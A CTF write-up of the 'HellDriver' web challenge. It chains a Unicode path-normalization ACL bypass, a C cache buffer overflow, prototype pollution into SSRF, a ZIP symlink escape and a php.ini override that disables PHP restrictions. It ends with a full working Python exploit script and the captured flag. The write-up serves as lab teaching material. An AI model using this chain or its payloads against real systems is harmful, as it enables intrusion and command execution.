# HellDriver

> **Category:** Web · **Event:** KubSTU CTF 2026 Autumn · **1000 pts** · **Date:** 11 October 2026
> Task author: [@thxStuck](https://t.me/thankspIuxury) · Infrastructure Administrator: [@ZloyTapochek](https://t.me/ddsddmitriy)
> Community (user) writeup by team **GR3B0M4** · Source: https://ctftime.org/writeup/41136 (CTFtime)

## 📌 Task

A Web challenge worth 1000 points. The application is made up of several proxied services: Caddy on the external perimeter, a FastAPI backend with internal Vault methods, a custom C cache called AetherCache, and a PHP ImageProxy. The flag can only be read by chaining six independent weaknesses into a single exploit chain.

## 🏁 Solution

### TL;DR

In HellDriver you had to chain six small vulnerabilities into one chain: bypass the ACL through a Unicode-normalization mismatch, overflow a key buffer in AetherCache, turn a cache entry into trusted metadata, pollute the prototype and obtain SSRF, restore a ZIP via a symlink outside the extraction directory, and weaken the PHP sandbox through a custom `php.ini`.

The resulting chain looked like this:

```text
Caddy ACL bypass
  → update_meta
  → AetherCache flags = 1
  → prototype pollution
  → SSRF во внутренний restore
  → ZIP symlink escape
  → перезапись php-overrides.ini
  → action=readflag
```

### Reconnaissance

The application consisted of several proxied services: Caddy on the external perimeter, FastAPI with internal Vault methods, a custom C cache AetherCache and a PHP ImageProxy. The following points were needed for the final chain:

| Method | Endpoint | Purpose |
|---|---|---|
| `POST` | `/api/register` | Create a tenant session |
| `PUT` | `/api/internal/vault/update_meta` | Write metadata into AetherCache; closed by ACL |
| `GET` | `/market?meta=...` | Read a raw metadata entry from the cache |
| `POST` | `/api/vault/upload` | Upload the future ZIP |
| `GET` | `/imageproxy/api?action=...` | Run PHP in the tenant sandbox |

`robots.txt` revealed the name of the protected endpoint `update_meta`. An ordinary request to it consistently got a Caddy `403`; a non-existent FastAPI route returned a JSON `404`. This made it possible to clearly distinguish an edge block from an upstream response and to test path-normalization variants.

### 1. ACL bypass and AetherCache overflow

The protected endpoint existed at:

```http
PUT /api/internal/vault/update_meta
```

On the ordinary path Caddy returned `403 Forbidden`. But the edge and the upstream normalized Unicode differently. If you replaced the first `i` in `internal` with the dotless i `ı` (`U+0131`), the request slipped past the ACL, yet the backend still selected the right handler:

```http
PUT /api/%C4%B1nternal/vault/update_meta
Content-Type: application/json
Cookie: __Host-AV=...

{}
```

The response `200 {"ok":true}` confirmed a full bypass: this was not a `403 → 404` transition, but a hit on an existing `PUT` endpoint.

`update_meta` stored data under the key `meta:<symbol>`. The `symbol` field went into a fixed C buffer, and starting from the 256th character the following bytes overwrote the 32-bit `flags` field:

```text
symbol length 255 → flags = 0
symbol length 256, последний байт "A" → flags = 65
symbol = "E" * 255 + "\x01" → flags = 1
```

The cache key was limited to 255 bytes. Since the `meta:` prefix takes five bytes, the overflowed entry had to be read by its first 250 characters:

```http
GET /market?meta=EEEE...EEEE   # ровно 250 символов
```

With `flags=1`, Market selected the unsafe cache-entry handling branch (`card-trade-unsafe`).

### 2. Prototype pollution turns into SSRF

The most important detail was the `value` field: it had to be a **JSON string**, not a nested JSON object. The working value looked like this:

```json
{
  "__proto__": {"allowLocalFetch": true},
  "zipPath": "/srv/<tid>/uploads/<uuid>"
}
```

The full request to poison the cache entry:

```python
meta = "E" * 250
symbol = meta + "E" * 5 + "\x01"
value = json.dumps({
    "__proto__": {"allowLocalFetch": True},
    "zipPath": f"/srv/{tid}/uploads/{stored_as}",
})

session.put(
    BASE + "/api/%C4%B1nternal/vault/update_meta",
    json={"symbol": symbol, "value": value},
)
```

After reading it through `/market?meta=<250-byte-prefix>`, the application parsed the trusted value and unsafely merged it into the configuration. There was no `allowLocalFetch` key of its own in the config, so the lookup fell through into the polluted prototype. The ordinary `zipPath` key set the path for the internal restore request.

This was conveniently verified first with a non-existent file:

```json
{
  "status": 404,
  "body": "{\"detail\":\"zip not found\"}"
}
```

That is, the SSRF already worked and reached the internal restore service.

### 3. ZIP symlink escape and escaping the PHP sandbox

Vault accepted a ZIP under the MIME type `text/plain` and returned a random name:

```json
{"ok":true,"stored_as":"c06666494b504532af55b3005aca0abf"}
```

Direct Zip Slip was blocked:

```json
{"detail":"unsafe entry: ../php-overrides.ini"}
```

However, the extractor trusted a Unix symlink inside the archive. Restore extracted the files into `/srv/<tid>/unzip`, so the archive created the link `escape → ..`, and the next entry traversed through it into the root of the tenant sandbox:

```text
archive.zip
├── escape -> ..
└── escape/php-overrides.ini
```

The contents of `php-overrides.ini` cleared the restrictions:

```ini
open_basedir=
disable_functions=
```

After extraction the file ended up at `/srv/<tid>/php-overrides.ini`. ImageProxy ran each request like this:

```text
php -c /srv/<tid>/php-overrides.ini -f /app/imagesvc/index.php
```

So the next request started PHP already without `disable_functions`. The `readflag` action called `/readflag` and returned the secret:

```http
GET /imageproxy/api?action=readflag
```

```json
{"ok":true,"flag":"kubstu{69f64633b50fc9b8_0f2d46e5d10371f9}"}
```

### Full exploit

```python
#!/usr/bin/env python3
import io
import json
import re
import stat
import zipfile

import requests

BASE = "https://159.194.249.254:8443"
UPDATE_META = "/api/%C4%B1nternal/vault/update_meta"

requests.packages.urllib3.disable_warnings()
s = requests.Session()
s.verify = False

# Register a tenant.
s.post(BASE + "/api/register", allow_redirects=False).raise_for_status()
tid = s.cookies.get("__Host-AV").split(".", 1)[0]

# Build the symlink archive.
buf = io.BytesIO()
with zipfile.ZipFile(buf, "w", zipfile.ZIP_STORED) as zf:
    link = zipfile.ZipInfo("escape")
    link.create_system = 3
    link.external_attr = (stat.S_IFLNK | 0o777) << 16
    zf.writestr(link, "..")
    zf.writestr("escape/php-overrides.ini", "open_basedir=\ndisable_functions=\n")

# Upload it as an ordinary Vault document.
r = s.post(
    BASE + "/api/vault/upload",
    files={"file": ("restore.txt", buf.getvalue(), "text/plain")},
)
r.raise_for_status()
stored_as = r.json()["stored_as"]

# Overflow cache flags and inject the trusted metadata value.
meta = "E" * 250
symbol = meta + "E" * 5 + "\x01"
value = json.dumps({
    "__proto__": {"allowLocalFetch": True},
    "zipPath": f"/srv/{tid}/uploads/{stored_as}",
})
r = s.put(
    BASE + UPDATE_META,
    json={"symbol": symbol, "value": value},
)
r.raise_for_status()

# Reading the poisoned entry triggers the internal restore.
r = s.get(BASE + "/market", params={"meta": meta}, timeout=20)
r.raise_for_status()
assert "extracted" in r.text

# The overwritten ini enables the final command execution sink.
r = s.get(BASE + "/imageproxy/api", params={"action": "readflag"})
r.raise_for_status()
print(re.search(r"kubstu\{[^}]+\}", r.text).group(0))
```

Output:

```text
kubstu{69f64633b50fc9b8_0f2d46e5d10371f9}
```

### What mattered

- A `403 → 404` transition does not yet prove an ACL bypass; a successful bypass must reach a real upstream handler.
- At a language boundary it is important to check not only the length of a string, but the physical placement of a structure's fields. One byte after `symbol[255]` completely changed the semantics of the cache entry.
- A JSON object and a string containing JSON were fundamentally different here: prototype pollution only triggered after the second parse of `value`.
- Checking ZIP entry names without safe symlink handling does not prevent escaping the extraction directory.
- A custom `php.ini` is a full-fledged security boundary: the ability to overwrite it is equivalent to removing `open_basedir` and `disable_functions`.

**Flag:** `kubstu{69f64633b50fc9b8_0f2d46e5d10371f9}`
